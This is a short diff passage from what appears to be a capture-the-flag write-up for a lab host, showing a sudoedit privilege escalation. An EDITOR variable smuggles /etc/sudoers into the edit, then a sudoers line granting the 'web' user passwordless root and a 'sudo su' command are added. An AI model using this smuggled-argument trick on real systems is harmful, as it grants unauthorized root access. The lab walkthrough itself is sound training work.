@@ -199,7 +199,14 @@ export EDITOR="nano -- /etc/sudoers"
 sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 ```
 
+```
+web ALL=(root) NOPASSWD: ALL
+```
 
+```
+sudo su
+```
+done
 
 
 
